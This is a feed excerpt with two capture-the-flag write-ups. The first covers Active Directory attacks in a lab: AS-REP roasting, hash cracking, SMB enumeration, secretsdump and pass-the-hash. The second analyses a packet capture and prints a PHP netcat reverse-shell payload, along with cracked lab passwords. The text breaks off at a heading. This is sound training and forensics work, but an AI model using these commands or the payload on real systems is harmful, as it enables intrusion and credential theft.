&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;python3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;/usr/share/doc/python3-impacket/examples/GetNPUsers.py &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;-outputfile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;attacktive-directory.getnpusers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;-usersfile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;attacktive-directory.targets&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;-dc-ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; spookysec.local/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;GetNPUsers.py reports that backup isn’t vulnerable to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/as-rep-roasting&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/as-rep-roasting&quot;&gt;AS-REP roasting&lt;/a&gt;, but svc-admin &lt;em&gt;is&lt;/em&gt; vulnerable and we get back a valid &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt; password hash.&lt;/p&gt;
&lt;p&gt;A quick lookup in the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt; &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;example hashes wiki page&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; shows that this is a “&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/kerberos&quot;&gt;Kerberos&lt;/a&gt; 5, etype 23, AS-REP” hash (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt; mode 18200). We’ll crack this using &lt;a href=&quot;https://github.com/Sq00ky/attacktive-directory-tools/blob/master/passwordlist.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the provided password list&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 18200&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;        -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; attacktive-directory.getnpusers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;           passwordlist.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This reveals that the password for the svc-admin account is &lt;code&gt;management2005&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Before moving on, we’ll connect to the target as svc-admin using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/xfreerdp&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/xfreerdp&quot;&gt;XFreeRDP&lt;/a&gt; to get the first flag.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;         /v:10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /u:svc-admin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /p:management2005&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This flag is in a file called user.txt on svc-admin’s desktop.&lt;/p&gt;
&lt;h2 id=&quot;back-to-the-basics&quot;&gt;Back to the basics&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#back-to-the-basics&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We’re going to drop down and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/how-to-enumerate-services-and-shares-using-smbclient&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/how-to-enumerate-services-and-shares-using-smbclient&quot;&gt;use smbclient to enumerate potential shares&lt;/a&gt; on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the &lt;code&gt;-L&lt;/code&gt; switch).&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;smbclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; THM-AD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -I&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -U&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; svc-admin%management2005&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Which gives us the following output.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to THM-AD failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There’s six shares, but only five of these are disks. We’ll poke around a bit using &lt;code&gt;smbclient //THM-AD/${SHARENAME} -I 10.10.177.198 -U svc-admin%management2005&lt;/code&gt;; as one might guess, //THM-AD/backup contains a &lt;code&gt;backup_credentials.txt&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;The contents of this file naively appear to be base64 encoded, and indeed piping it through &lt;code&gt;base64 -d&lt;/code&gt; reveals that the password for the backup account is &lt;code&gt;backup2517860&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We’ll again pause to connect to the target as backup to get the second flag.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;         /v:10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /u:backup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /p:backup2517860&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This flag is in a file called PrivEsc on backup’s desktop.&lt;/p&gt;
&lt;h2 id=&quot;elevating-privileges-within-the-domain&quot;&gt;Elevating privileges within the domain&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#elevating-privileges-within-the-domain&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The CTF now reveals that the backup account has all AD changes synced to it, including NT hashes, and that we can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/impacket&quot;&gt;Impacket&lt;/a&gt;’s secretsdump.py file to obtain these from NTDS.DIT.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;python3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;/usr/share/doc/python3-impacket/examples/secretsdump.py &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;-dc-ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;-target-ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;spookysec.local/backup:backup2517860@THM-AD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;(I got a bit tripped up here, as I didn’t read secretsdump.py’s output carefully enough — credentials are presented in the format &lt;code&gt;domain\uid:rid:lmhash:nthash&lt;/code&gt;, so the relevant NTLM hash is the &lt;em&gt;last&lt;/em&gt; hash for the Administrator account!)&lt;/p&gt;
&lt;p&gt;We’ll use the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/evil-winrm&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/evil-winrm&quot;&gt;Evil-WinRM&lt;/a&gt; tool to retrieve the final flag by &lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;passing the hash&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;evil-winrm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --user&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; Administrator&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;           --hash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; 0e0363213e37b94221497260b0bcb4fc&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;The final flag is in a file called root.txt on the Administrator account’s desktop.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 38 min&lt;/p&gt;</description>
    <pubDate>Thu, 30 Dec 2021 00:00:00 GMT</pubDate>
  </item><item>
    <title>Overpass 2: Hacked</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2021-12-14-overpass-2</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2021-12-14-overpass-2</guid>
    <description>&lt;p&gt;The flags are structured to basically walk us through this room.&lt;/p&gt;
&lt;h2 id=&quot;forensics-analyze-the-pcap&quot;&gt;Forensics: Analyze the PCAP&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#forensics-analyze-the-pcap&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;I’ve not actually used Wireshark outside of the &lt;a href=&quot;https://tryhackme.com/room/wireshark&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;TryHackMe: Wireshark 101&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; “room” (and a few short digressions in other rooms), so I’m honestly a little worried about my abilities here…&lt;/p&gt;
&lt;p&gt;Filtering the PCAP file for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/http&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/http&quot;&gt;HTTP&lt;/a&gt; requests reveals a single POST from 192.168.179.145 to &lt;code&gt;http://192.168.170.159/development/upload.php&lt;/code&gt;. A subsequent request from 192.168.179.145 pulls the directory listing of /development/uploads/, and then GETs /development/uploads/payload.php. This suggests that 192.168.179.145 is the “attacker” and 192.168.179.145 is the target system.&lt;/p&gt;
&lt;p&gt;We can save off this POST request to get at the uploaded payload.php file, which turns out to have the contents:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;php&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt; exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;#x26;1|nc 192.168.170.145 4242 &gt;/tmp/f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This is popping a simple reverse shell through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/netcat&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/netcat&quot;&gt;netcat&lt;/a&gt; that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.&lt;/p&gt;
&lt;p&gt;This means that penetration occurs when this file is requested in packet 27.&lt;/p&gt;
&lt;p&gt;Looking at subsequent &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/tcp&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/tcp&quot;&gt;TCP&lt;/a&gt; packets, we can see what the attacker typed in the packets going from 192.168.170.145 → 192.168.170.159, and the responses in the packets going from 192.168.170.159 → 192.168.170.145. Requests/Responses coming through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/netcat&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/netcat&quot;&gt;netcat&lt;/a&gt; use the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/tcp-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/tcp-header-flags&quot;&gt;TCP PSH flag&lt;/a&gt;, so we can filter by &lt;code&gt;tcp.port == 4242 and tcp.flags.push&lt;/code&gt; to zoom in on this conversation.&lt;/p&gt;
&lt;p&gt;The attacker eventually issues &lt;code&gt;su james&lt;/code&gt; to elevate privileges  (packet 71), and a few packets down we can see james’s password.&lt;/p&gt;
&lt;p&gt;In packet 112 the attacker cats /etc/shadow, and we get a full dump in packet 114. They then issue &lt;code&gt;git clone https://github.com/NinjaJc01/ssh-backdoor&lt;/code&gt;, generate an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; private key, and switch to the included backdoor binary, at which point we lose the thread.&lt;/p&gt;
&lt;p&gt;Returning to packet 114, we can use Copy → Copy Bytes as Printable Text to pull the contents of /etc/shadow (+ a little garbage).  After a little cleanup, we have 5 users with passwords (including james, which we know already).&lt;/p&gt;
&lt;p&gt;We extract the hashes and then throw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt; at this using the suggested “fasttrack” wordlist.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 1800&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;        -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; hashes.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/fasttrack.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Four out of the five passwords turn out to be crackable:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;paradox:secuirty3
szymex:abcd123
bee:secret12
muirland:1qaz2wsx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This ironically &lt;em&gt;doesn’t&lt;/em&gt; include james!&lt;/p&gt;
&lt;h2 id=&quot;research-analyze-the-code&quot;&gt;Research: Analyze the code&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#research-analyze-the-code&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
